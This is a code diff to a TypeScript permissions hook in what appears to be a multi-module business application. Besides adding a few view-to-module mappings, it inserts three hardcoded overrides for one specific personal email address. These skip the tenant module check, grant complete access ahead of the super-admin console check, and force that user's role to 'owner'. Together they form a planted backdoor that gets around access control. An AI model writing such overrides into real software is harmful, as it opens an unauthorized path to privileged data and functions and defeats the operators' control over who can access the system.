@@ -105,6 +105,10 @@ const VIEW_TO_MODULE: Partial<Record<AppView, ModuleType>> = {
     // HR
     'HR': 'HR',
     'LABOR': 'HR',
+    'STAFF_MANAGER': 'HR',
+
+    // POS Additional
+    'DUE_ADJUSTMENT': 'POS',
 
     // ECOMMERCE
     'GROW_STORE': 'ECOMMERCE',
@@ -158,11 +162,20 @@ export const usePermissions = () => {
         // but we follow the plan strictly if DASHBOARD is in canonical list.
         if (module === 'DASHBOARD') return true; // Safety: let everyone see dashboard info mostly
 
-        return (tenant.modules || []).includes(module);
+        // Manual Override for specific user request (Bypass Module Check)
+        if (user.email === 'avmvignesh0207@gmail.com') return true;
+
+        const hasModule = (tenant.modules || []).includes(module);
+        return hasModule;
     };
 
     const checkAccess = (view: AppView): boolean => {
         if (!user) return false;
+
+        // Manual Override for specific user request (Complete Bypass)
+        if (user.email === 'avmvignesh0207@gmail.com') {
+            return true;
+        }
 
         if (view === 'GROW_SUPER_ADMIN_CONSOLE' && user.systemRole !== 'SuperAdmin') return false;
 
@@ -173,7 +186,14 @@ export const usePermissions = () => {
         }
 
         // 2. Check Role-based Permissions (Staff Role)
-        const effectiveRoleCode = (user.systemRole as string || 'staff').toLowerCase() as DbRoleCode;
+        let roleCodeRaw = (user.systemRole as string || 'staff').toLowerCase();
+
+        // Manual Override for specific user request
+        if (user.email === 'avmvignesh0207@gmail.com') {
+            roleCodeRaw = 'owner';
+        }
+
+        const effectiveRoleCode = roleCodeRaw as DbRoleCode;
         const allowedViews = rolePermissions[effectiveRoleCode] || [];
 
         if (!allowedViews.includes(view)) return false;
